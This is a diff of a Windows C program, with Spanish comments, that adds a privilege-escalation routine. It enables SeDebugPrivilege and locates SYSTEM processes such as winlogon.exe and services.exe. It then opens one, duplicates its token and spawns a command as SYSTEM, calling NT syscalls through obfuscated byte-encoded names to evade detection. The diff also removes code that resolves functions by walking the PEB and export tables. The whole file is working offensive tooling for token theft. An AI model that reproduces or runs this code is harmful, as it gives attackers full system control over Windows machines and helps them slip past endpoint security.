@@ -14,6 +14,7 @@
 
 #include "DefsModule.h"
 
+#pragma comment(lib, "advapi32.lib")
 
 /*
 *
@@ -167,6 +168,12 @@ BYTE nSetKeyVal[] = {
     39, 19, 44, 4, 19, 47, 0, 11, 20, 4, 36, 4, 24
 };
 
+// NtOpenProcess
+BYTE nOpenProc[] =
+{
+    39, 19, 40, 15, 4, 13, 41, 17, 14, 2, 4, 18, 18
+};
+
 // NtOpenProcessToken
 BYTE nOpenToken[] = {
     39, 19, 40, 15, 4, 13, 41, 17, 14, 2, 4, 18, 18, 45, 14, 10, 4, 13
@@ -213,6 +220,21 @@ BYTE nCreateFile[] =
 BYTE nQueryInfoTkn[] =
 {
     39, 19, 42, 20, 4, 17, 24, 34, 13, 5, 14, 17, 12, 0, 19, 8, 14, 13, 45, 14, 10, 4, 13
+};
+
+// NtDuplicateToken
+BYTE nDuplicateTkn[] = {
+    39, 19, 29, 20, 15, 11, 8, 2, 0, 19, 4, 45, 14, 10, 4, 13
+};
+
+// NtCreateProcess
+BYTE nCreateProc[] = {
+    39, 19, 28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18
+};
+
+// NtCreateUserProcess
+BYTE nCreateUsrProc[] = {
+    39, 19, 28, 17, 4, 0, 19, 4, 46, 18, 4, 17, 41, 17, 14, 2, 4, 18, 18
 };
 
 // =====================================
@@ -406,71 +428,6 @@ BOOL CharToWChar(
     return (ret != 0);
 }
 
-HMODULE GetModuleBaseFromPEB(PBYTE moduleBytes, SIZE_T size) {
-    PTEB pCurrentTeb = GetEnvironmentThreadBlock();
-    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
-    PEB_LDR_DATA* ldr = pCurrentPeb->Ldr;
-    PLIST_ENTRY listHead = &ldr->InMemoryOrderModuleList;
-    PLIST_ENTRY entry = listHead->Flink;
-
-    char string_to_get[256] = { 0 };
-    WCHAR moduleName[256] = { 0 };
-
-    getWord(string_to_get, moduleBytes, size);
-
-    LOG_INFO("Module to Load: %s", string_to_get);
-
-    if (!CharToWChar(string_to_get, moduleName, _countof(moduleName))) {
-        return NULL;
-    }
-
-    LOG_INFO("Module Name after convert: %ls", moduleName);
-
-    while (entry != listHead) {
-        PLDR_DATA_TABLE_ENTRY_ALTERNATIVE ldrEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_ALTERNATIVE, InMemoryOrderLinks);
-        if (ldrEntry->BaseDllName.Buffer != NULL) {
-            // Comparar el nombre de la DLL (case insensitive)
-            if (_wcsicmp(ldrEntry->BaseDllName.Buffer, moduleName) == 0) {
-                return (HMODULE)ldrEntry->DllBase;
-            }
-        }
-        entry = entry->Flink;
-    }
-    return NULL;
-}
-
-FARPROC GetProcAddressFromExportTable(HMODULE moduleBase, PBYTE byteFunction, SIZE_T byteSize) {
-
-    char functionName[256] = { 0 };
-
-    getWord(functionName, byteFunction, byteSize);
-
-    LOG_INFO("Funcion a buscar: %s", functionName);
-
-    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)moduleBase;
-    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
-
-    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)moduleBase + dosHeader->e_lfanew);
-    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
-
-    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    if (exportDirRVA == 0) return NULL;
-
-    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)moduleBase + exportDirRVA);
-
-    DWORD* names = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfNames);
-    WORD* ordinals = (WORD*)((BYTE*)moduleBase + exportDir->AddressOfNameOrdinals);
-    DWORD* functions = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfFunctions);
-
-    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
-        char* currentName = (char*)((BYTE*)moduleBase + names[i]);
-        if (strcmp(currentName, functionName) == 0) {
-            return (FARPROC)((BYTE*)moduleBase + functions[ordinals[i]]);
-        }
-    }
-    return NULL;
-}
-
 //=================================================================
 
 BOOL IsRunningAsSystem()
@@ -557,42 +514,249 @@ BOOL IsRunningAsSystem()
     return bResult;
 }
 
+BOOL getPrivs()
+{
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LPCTSTR lpszPrivilege = TEXT("SeDebugPrivilege");
+
+    LUID luid;
+
+    funStruct sOpenTkn;
+    sOpenTkn.name = nOpenToken;
+    sOpenTkn.size = sizeof(nOpenToken);
+
+    if (!get_numSys(&sOpenTkn))
+    {
+        LOG_ERROR("No se obtuvo stub de open token");
+        return FALSE;
+    }
+
+    SetCall(sOpenTkn.sysnum);
+    NTSTATUS status = CallFunc(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
+
+    if (status)
+    {
+        LOG_ERROR("No se obtuvo el token. E: 0x%08x", status);
+    }
+
+    if (!LookupPrivilegeValueA(NULL, lpszPrivilege, &luid)) {
+        LOG_ERROR("LookupPrivilegeValue error: %u", GetLastError());
+        return FALSE;
+    }
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    funStruct sAdjustPrivs;
+    sAdjustPrivs.name = nAdjustPrivs;
+    sAdjustPrivs.size = sizeof(nAdjustPrivs);
+
+    if (!get_numSys(&sAdjustPrivs))
+    {
+        LOG_ERROR("No se obtuvo stub de open token");
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    SetCall(sAdjustPrivs.sysnum);
+    status = CallFunc(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+
+    if (status)
+    {
+        LOG_ERROR("Error en ejecucion de funcion de AdjsPrivsToken");
+        CloseHandle(hToken);
+        return FALSE;
+    }
+
+    LOG_OK("Valor de Token ajustado");
+
+    CloseHandle(hToken);
+
+    return TRUE;
+}
+
+int FindTargetProcess(const char** procnames, int count) {
+    HANDLE hProcSnap;
+    PROCESSENTRY32 pe32;
+    int pid = 0;
+
+    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hProcSnap) {
+        return 0;
+    }
+
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (!Process32First(hProcSnap, &pe32)) {
+        CloseHandle(hProcSnap);
+        return 0;
+    }
+
+    while (Process32Next(hProcSnap, &pe32)) {
+        for (int i = 0; i < count; i++) {
+            if (lstrcmpiA(procnames[i], pe32.szExeFile) == 0) {
+                pid = pe32.th32ProcessID;
+                LOG_OK("Proceso encontrado: %s (PID: %d)\n",
+                    procnames[i], pid);
+                goto cleanup;
+            }
+        }
+    }
+
+cleanup:
+    CloseHandle(hProcSnap);
+    return pid;
+}
+
+BOOL OpenProcessSyscall(DWORD target_pid, HANDLE* phProcess) {
+
+    funStruct sOpenProc;
+    sOpenProc.name = nOpenProc;
+    sOpenProc.size = sizeof(nOpenProc);
+
+    if (!get_numSys(&sOpenProc)) {
+        LOG_ERROR("No se obtuvo stub de NtOpenProcess");
+        return FALSE;
+    }
+
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
+    CLIENT_ID cid;
+    cid.UniqueProcess = (HANDLE)(ULONG_PTR)target_pid;
+    cid.UniqueThread = NULL;
+
+    HANDLE hLocalProcess = NULL;
+    NTSTATUS status;
+
+    SetCall(sOpenProc.sysnum);
+    status = CallFunc(&hLocalProcess, PROCESS_QUERY_INFORMATION, &oa, &cid);
+
+    if (NT_SUCCESS(status)) {
+        *phProcess = hLocalProcess;
+        LOG_OK("Proceso abierto con QueryInformation");
+        return TRUE;
+    }
+
+    LOG_ERROR("Error en NtOpenProcess: 0x%08x (incluso con QueryLimited)", status);
+    return FALSE;
+}
+
 //=================================================================
 
 // Entry Point
 int main()
 {
-
     LOG_INFO("Iniciando programa");
 
-    if (!init_program())
-    {
+    if (!init_program()) {
         return -1;
     }
 
-    // Now get the tkn 
     HANDLE hProcess = NULL, hToken = NULL, hTokenDuplicate = NULL;
-
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
-
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
     CHAR command[256] = { 0 };
+    WCHAR commandW[256];
+    NTSTATUS status = 0;
 
     getWord(command, pathCmd, sizeof(pathCmd));
+    if (!CharToWChar(command, commandW, _countof(commandW))) {
+        LOG_ERROR("Error al cambiar el tipo de letra en comando");
+        return -1;
+    }
+    LOG_INFO("Comando: %ls", commandW);
 
     LOG_INFO("Revisando permisos");
-
-    if (IsRunningAsSystem())
-    {
-        LOG_INFO("Ya estamos cirrendo en SYSTEM!");
-        LOG_INFO("Spawning cmd.exe");
-
+    if (IsRunningAsSystem()) {
+        LOG_INFO("Ya estamos corriendo en SYSTEM!");
         system("cmd.exe");
         return 0;
     }
 
     LOG_INFO("Habilitando Privs");
+    if (!getPrivs()) {
+        LOG_ERROR("No se pudieron obtener los privilegios");
+        return -1;
+    }
+
+    const char* targetProcesses[] = {
+        "services.exe",
+        "spoolsv.exe",
+        "winlogon.exe",
+        "wininit.exe"
+    };
+
+    int target_pid = FindTargetProcess(targetProcesses, 4);
+    if (target_pid == 0) {
+        LOG_ERROR("No se encontró un proceso SYSTEM");
+        return -1;
+    }
+
+    if (!OpenProcessSyscall(target_pid, &hProcess)) {
+        LOG_ERROR("No se pudo abrir el proceso");
+        goto cleanup;
+    }
+    LOG_OK("Proceso abierto: PID %d", target_pid);
+
+    funStruct sOpenTkn;
+    sOpenTkn.name = nOpenToken;
+    sOpenTkn.size = sizeof(nOpenToken);
+    if (!get_numSys(&sOpenTkn)) {
+        LOG_ERROR("No se obtuvo stub de NtOpenProcessToken");
+        goto cleanup;
+    }
+    SetCall(sOpenTkn.sysnum);
+    status = CallFunc(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken);
+    if (!NT_SUCCESS(status)) {
+        LOG_ERROR("NtOpenProcessToken falló: 0x%08x", status);
+        goto cleanup;
+    }
+    LOG_OK("Token del proceso obtenido");
+
+    funStruct sDuplicateTkn;
+    sDuplicateTkn.name = nDuplicateTkn;
+    sDuplicateTkn.size = sizeof(nDuplicateTkn);
+    if (!get_numSys(&sDuplicateTkn)) {
+        LOG_ERROR("No se obtuvo stub de NtDuplicateToken");
+        goto cleanup;
+    }
+    SetCall(sDuplicateTkn.sysnum);
+    status = CallFunc(
+        hToken,              // Token existente
+        TOKEN_ALL_ACCESS,    // DesiredAccess para el nuevo token
+        &oa,                 // ObjectAttributes
+        FALSE,               // EffectiveOnly
+        TokenPrimary,        // TokenType
+        &hTokenDuplicate     // Nuevo token duplicado
+    );
+    if (!NT_SUCCESS(status)) {
+        LOG_ERROR("NtDuplicateToken falló: 0x%08x", status);
+        goto cleanup;
+    }
+    LOG_OK("Token duplicado exitosamente");
+
+    ZeroMemory(&si, sizeof(STARTUPINFOW));
+    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+    si.cb = sizeof(STARTUPINFOW);
+
+    if (!CreateProcessWithTokenW(hTokenDuplicate, LOGON_WITH_PROFILE, commandW, NULL,
+        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        LOG_ERROR("Failed to CreateProcessWithTokenW: %d", GetLastError());
+        goto cleanup;
+    }
+
+    LOG_OK("Process spawned successfully!");
+    LOG_OK("New process PID: %d", pi.dwProcessId);
+    LOG_OK("You now have SYSTEM privileges!");
+
+cleanup:
+    if (hProcess) CloseHandle(hProcess);
+    if (hToken) CloseHandle(hToken);
+    if (hTokenDuplicate) CloseHandle(hTokenDuplicate);
+    if (pi.hProcess) CloseHandle(pi.hProcess);
+    if (pi.hThread) CloseHandle(pi.hThread);
 
     return 0;
-
 }
